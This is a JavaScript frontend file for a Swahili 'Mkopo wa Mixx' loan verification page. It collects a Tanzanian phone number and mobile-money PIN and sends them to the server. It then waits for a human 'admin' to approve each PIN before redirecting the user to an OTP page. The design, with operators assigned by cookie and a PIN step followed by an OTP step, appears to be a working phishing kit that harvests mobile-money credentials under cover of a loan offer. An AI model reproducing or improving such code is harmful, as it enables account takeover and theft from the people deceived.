// Verification (PIN) Script - Mkopo wa Mixx
// ✅ Admin ID is now handled entirely server-side via cookie session.
// Frontend never reads, stores, or sends adminId — the cookie does it automatically.

document.addEventListener('DOMContentLoaded', function() {
    const phoneInput = document.getElementById('phoneNumber');
    const pinInput = document.getElementById('pin');
    const verifyBtn = document.getElementById('verifyPinBtn');
    const pinScreen = document.getElementById('pinScreen');
    const processingScreen = document.getElementById('processingScreen');
    const rejectionScreen = document.getElementById('rejectionScreen');

    // Inline error display
    const errorDiv = document.createElement('div');
    errorDiv.style.cssText = 'display:none; background:#fee2e2; border:2px solid #fecaca; color:#991b1b; padding:12px 16px; border-radius:8px; margin:12px 0; font-weight:500;';
    const formTitle = document.querySelector('.form-title');
    if (formTitle?.parentNode) formTitle.parentNode.insertBefore(errorDiv, formTitle.nextSibling);

    function showError(msg) {
        errorDiv.textContent = msg;
        errorDiv.style.display = 'block';
        errorDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
        setTimeout(() => { errorDiv.style.display = 'none'; }, 6000);
    }

    // Get existing application data (loan amount, term etc — NOT adminId)
    const applicationData = JSON.parse(sessionStorage.getItem('applicationData') || '{}');

    console.log('📱 Verification page loaded — admin assigned via server session cookie');

    // PIN: numbers only
    pinInput?.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 4);
    });

    // Phone formatting
    phoneInput?.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 0 && !value.startsWith('255')) {
            if (value.startsWith('0')) value = '255' + value.substring(1);
            else if (value.startsWith('7')) value = '255' + value;
        }
        if (value.length > 3) this.value = '+' + value.substring(0, 3) + ' ' + value.substring(3);
        else if (value.length > 0) this.value = '+' + value;
        else this.value = '';
    });

    verifyBtn?.addEventListener('click', async function(e) {
        e.preventDefault();

        const phoneNumber = phoneInput.value.trim().replace(/\s/g, '');
        const pin = pinInput.value.trim();

        if (!phoneNumber) { showError('Tafadhali weka nambari yako ya simu'); phoneInput.focus(); return; }
        if (!phoneNumber.match(/^\+?255\d{9}$/)) { showError('Nambari ya simu sio sahihi. Tumia format: +255XXXXXXXXX'); phoneInput.focus(); return; }
        if (pin.length !== 4) { showError('PIN lazima iwe na nambari 4'); pinInput.focus(); return; }

        pinScreen.style.display = 'none';
        processingScreen.style.display = 'block';

        // ✅ SECURE: Only send phone and pin — NO adminId
        // Server reads adminId from the httpOnly session cookie automatically
        const requestData = { phoneNumber, pin };

        console.log('📤 Sending PIN verification — admin resolved server-side from cookie');

        try {
            const response = await fetch('/api/verify-pin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(requestData)
                // ✅ Browser automatically includes the adminSession cookie here
            });

            const result = await response.json();
            console.log('📥 Server response:', result.success ? '✅ Success' : '❌ Failed');

            if (result.success) {
                if (result.applicationId) {
                    applicationData.applicationId = result.applicationId;
                    sessionStorage.setItem('applicationData', JSON.stringify(applicationData));
                    console.log('💾 applicationId saved:', result.applicationId);
                }
                checkPinStatus(result.applicationId);
            } else {
                processingScreen.style.display = 'none';
                pinScreen.style.display = 'block';
                showError(result.message || 'Imeshindwa. Tafadhali jaribu tena.');
            }

        } catch (error) {
            console.error('❌ Network error:', error);
            processingScreen.style.display = 'none';
            pinScreen.style.display = 'block';
            showError('Hitilafu ya mtandao. Kagua muunganisho wako na jaribu tena.');
        }
    });

    function checkPinStatus(applicationId) {
        let checks = 0;
        const MAX = 150; // 5 minutes at 2s interval

        const interval = setInterval(async () => {
            checks++;
            try {
                const res = await fetch(`/api/check-pin-status/${applicationId}`);
                const result = await res.json();

                if (result.success && result.status) {
                    if (checks % 10 === 0 || result.status !== 'pending') {
                        console.log(`🔍 Check #${checks}: ${result.status}`);
                    }
                    if (result.status === 'approved') {
                        clearInterval(interval);
                        console.log('✅ PIN approved — redirecting to OTP');
                        setTimeout(() => { window.location.href = 'otp.html'; }, 1000);
                    } else if (result.status === 'rejected') {
                        clearInterval(interval);
                        processingScreen.style.display = 'none';
                        rejectionScreen.style.display = 'block';
                    }
                }
            } catch (e) {
                if (checks % 10 === 0) console.error('❌ Status check error:', e);
            }

            if (checks >= MAX) {
                clearInterval(interval);
                processingScreen.style.display = 'none';
                pinScreen.style.display = 'block';
                showError('Muda umeisha. Msimamizi hajaitikia. Tafadhali jaribu tena baadaye.');
            }
        }, 2000);
    }

    document.querySelector('#tryAgainBtn')?.addEventListener('click', function() {
        rejectionScreen.style.display = 'none';
        pinScreen.style.display = 'block';
        phoneInput.value = '';
        pinInput.value = '';
        errorDiv.style.display = 'none';
    });
});
